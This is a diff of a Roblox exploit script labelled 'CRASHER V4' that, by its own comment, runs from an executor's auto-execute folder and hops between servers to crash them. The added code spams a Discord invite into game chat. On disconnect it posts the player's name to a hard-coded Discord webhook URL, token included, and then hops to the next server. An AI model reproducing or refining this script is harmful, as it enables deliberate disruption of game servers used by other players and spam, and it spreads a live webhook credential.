@@ -1,7 +1,14 @@
 -- place script in auto execute folder it server hop for more chance of crashing the server (rebooting it)
--- CRASHER V2
+-- CRASHER V4
 warn("water_hax")
--- game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("SERVER REBOOTING FOR UPDATE WARNING JOIN cBKaHEGptc - TEAM HAXA")
+
+coroutine.wrap(function()
+for i = 1,2 do
+game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Tired of server reboot ?join gg/YyEyRh9WSa")
+task.wait(1)
+end
+end)()
+
 task.wait()
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 local TeleportService = game:GetService("TeleportService")
@@ -85,9 +92,11 @@ local function HOPPING()
     end
 end
 
-game.Players.PlayerRemoving:Connect(function(plr)
-if plr.Name == lp.Name then
- local HttpService = game:GetService("HttpService")
+coroutine.wrap(function()
+	while task.wait() do
+b=game:GetService("GuiService"):GetErrorCode()
+if b ~= Enum.ConnectionError.OK then
+local HttpService = game:GetService("HttpService")
  http.request({
             Url = "https://discord.com/api/webhooks/1539253154519056496/1cKfkl5oDiqIeue7J5waVY20z6MpvVjle3d0QiaJbS-7YivEzNUN9sKqYEahbVi5nUwd",
             Method = "POST",
@@ -99,10 +108,12 @@ if plr.Name == lp.Name then
                 username = game.Players.LocalPlayer.Name .. " Down"
             })
         })
-
-HOPPING()
+	task.wait(2)
+	HOPPING()
+	break
 end
-end)
+end
+end)()
 
 for i = 1, 5 do
     -- Start
